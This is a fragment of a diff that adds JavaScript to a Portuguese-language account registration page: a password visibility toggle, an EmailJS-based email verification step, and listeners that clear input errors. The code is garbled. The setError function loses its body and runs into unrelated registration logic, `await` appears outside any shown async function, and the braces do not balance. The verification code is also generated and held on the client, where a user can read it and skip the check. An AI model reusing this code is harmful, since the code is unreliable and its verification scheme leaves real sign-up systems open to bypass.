+    function togglePwd(id, btn) {
+      const inp = document.getElementById(id);
+      inp.type = inp.type === 'text' ? 'password' : 'text';
+      btn.style.color = inp.type === 'text' ? 'var(--accent)' : 'var(--text-muted)';
+    }
+  
+    function setError(inputId, hintId, msg) {
+ 
+      userName  = document.getElementById('reg-nome').value.trim();
+      verificationCode = generateCode();
+  
+      document.getElementById('verify-email-show').textContent = userEmail;
+      document.querySelectorAll('#code-inputs input').forEach(i => i.value = '');
+      document.getElementById('hint-code').style.display = 'none';
+      document.getElementById('email-status').textContent = 'Enviando código...';
+      document.getElementById('email-status').style.color = 'var(--text-secondary)';
+      showScreen('screen-verify');
+      document.querySelectorAll('#code-inputs input')[0].focus();
+  
+      btn.disabled = false; btn.classList.remove('loading');
+  
+      try {
+        await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+  
+          to_email: userEmail,
+          to_name:  userName,
+          code:     verificationCode
+        });
+        document.getElementById('email-status').textContent = '✓ Email enviado. Verifique sua caixa de entrada e o spam.';
+  
+        document.getElementById('email-status').style.color = 'var(--success)';
+      } catch(err) {
+  
+        document.getElementById('email-status').textContent = '⚠ Erro ao enviar: ' + (err.text || JSON.stringify(err));
+        document.getElementById('email-status').style.color = 'var(--error)';
+      }
+ 
+    // Clear errors on input
+    ['reg-nome','reg-user','reg-tel','reg-nasc','reg-email','reg-senha','reg-senha2'].forEach(id => {
+      const hints = {
+        'reg-nome':'h-nome','reg-user':'h-user','reg-tel':'h-tel',
+        'reg-nasc':'h-nasc','reg-email':'h-email','reg-senha':'h-senha','reg-senha2':'h-senha2'
+      };
+      document.getElementById(id).addEventListener('input', () => clearError(id, hints[id]));
+    });
+      </script>
